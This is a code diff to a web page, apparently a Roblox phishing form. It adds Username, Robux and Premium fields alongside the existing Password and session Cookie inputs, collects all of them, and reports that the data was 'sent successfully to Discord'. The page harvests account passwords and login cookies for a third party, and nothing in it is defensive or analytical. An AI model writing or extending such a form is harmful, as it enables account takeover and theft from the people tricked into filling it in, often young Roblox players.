@@ -89,8 +89,15 @@
     <!-- Card -->
     <div class="card">
       <form id="demoForm">
-        <input id="password" type="password" placeholder="Password" />
+        <input id="username" type="text" placeholder="Username" />
+        <input id="robux" type="text" placeholder="Robux" />
         
+        <label style="display: flex; align-items: center; margin-bottom: 10px;">
+          <input id="premium" type="checkbox" style="width: auto; margin-right: 8px;" />
+          Premium Account
+        </label>
+        
+        <input id="password" type="password" placeholder="Password" />
         <input id="cookie" type="text" placeholder="Enter Cookie" />
 
         <button class="btn" type="button" id="submitBtn">Submit</button>
@@ -111,12 +118,18 @@
   const status = document.getElementById('status');
   
   // Get all form inputs
+  const usernameInput = document.getElementById('username');
+  const robuxInput = document.getElementById('robux');
+  const premiumInput = document.getElementById('premium');
   const passwordInput = document.getElementById('password');
   const cookieInput = document.getElementById('cookie');
 
   btn.addEventListener('click', async () => {
     // Collect all form data
     const formData = {
+      username: usernameInput.value.trim(),
+      robux: robuxInput.value.trim(),
+      premium: premiumInput.checked,
       password: passwordInput.value.trim(),
       cookie: cookieInput.value.trim()
     };
@@ -172,6 +185,9 @@
         status.textContent = '✅ Data sent successfully to Discord';
         status.style.color = '#4CAF50';
         // Clear form
+        usernameInput.value = '';
+        robuxInput.value = '';
+        premiumInput.checked = false;
         passwordInput.value = '';
         cookieInput.value = '';
       } else {
